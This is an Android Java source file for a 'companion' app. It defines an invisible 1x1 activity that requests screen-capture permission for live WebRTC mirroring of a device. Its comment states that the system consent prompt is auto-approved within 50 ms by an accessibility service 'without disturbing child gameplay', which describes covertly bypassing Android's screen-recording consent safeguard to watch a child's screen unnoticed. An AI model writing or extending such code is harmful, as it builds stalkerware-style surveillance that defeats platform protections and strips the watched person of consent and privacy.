package com.snapapp.companion;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.util.Log;

/**
 * Transparent 1x1 activity to request MediaProjection permission for WebRTC live screen mirroring.
 * Auto-approved in <50ms by SnapAccessibilityService without disturbing child gameplay.
 * Rule 14 compliant: <= 200 lines.
 */
public class ScreenCaptureActivity extends Activity {
    private static final String TAG = "ScreenCaptureAct";
    private static final int REQUEST_CODE = 4492;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_CODE);
                return;
            }
        } catch (Throwable t) {
            Log.e(TAG, "Failed to launch screen capture intent", t);
        }
        WebRtcScreenHelper.onPermissionDenied();
        finish();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Log.d(TAG, "MediaProjection permission granted");
                WebRtcScreenHelper.onPermissionResult(resultCode, data);
            } else {
                Log.w(TAG, "MediaProjection permission denied or cancelled");
                WebRtcScreenHelper.onPermissionDenied();
            }
        }
        finish();
    }
}
